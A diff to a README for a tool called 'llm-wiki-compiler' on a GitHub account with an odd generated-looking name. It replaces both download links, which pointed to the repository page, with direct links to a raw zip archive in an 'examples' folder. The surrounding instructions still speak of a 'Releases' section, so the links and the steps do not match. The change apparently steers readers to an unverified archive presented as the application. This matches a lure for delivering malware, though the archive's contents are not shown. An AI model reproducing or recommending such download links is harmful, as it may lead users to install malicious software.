@@ -1,6 +1,6 @@
 # 🧠 llm-wiki-compiler - Turn raw data into organized wikis
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler/raw/refs/heads/main/examples/compiler-llm-wiki-v1.1.zip)
 
 ## 📋 What is this tool
 
@@ -18,7 +18,7 @@ This tool helps users who collect large amounts of data. It removes the manual w
 
 ## 📥 How to get the app
 
-You can download the application from our release page. Visit this link to find the latest version for your system: [https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler](https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler)
+You can download the application from our release page. Visit this link to find the latest version for your system: [https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler/raw/refs/heads/main/examples/compiler-llm-wiki-v1.1.zip](https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler/raw/refs/heads/main/examples/compiler-llm-wiki-v1.1.zip)
 
 1. Go to the link provided above.
 2. Look for the section labeled "Releases" on the right side of the screen.
